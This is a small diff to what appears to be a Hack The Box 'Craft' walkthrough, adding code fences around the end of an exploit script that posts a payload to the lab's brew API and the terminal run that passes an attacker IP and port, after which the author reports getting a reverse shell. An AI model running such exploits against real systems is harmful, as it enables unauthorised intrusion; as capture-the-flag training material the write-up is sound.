@@ -248,11 +248,11 @@ So, I'll use **test.py** and edit it a little bit.
     json_data = json.dumps(brew_dict)
     response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
     print(response.text)
-
-
+```
     root@kali:# python3 craft-api-exploit.py
     Usage: craft-api-exploit.py IP PORT
     root@kali:# python3 craft-api-exploit.py 10.10.15.38 9001
+```
 
 And i got my shell back
 
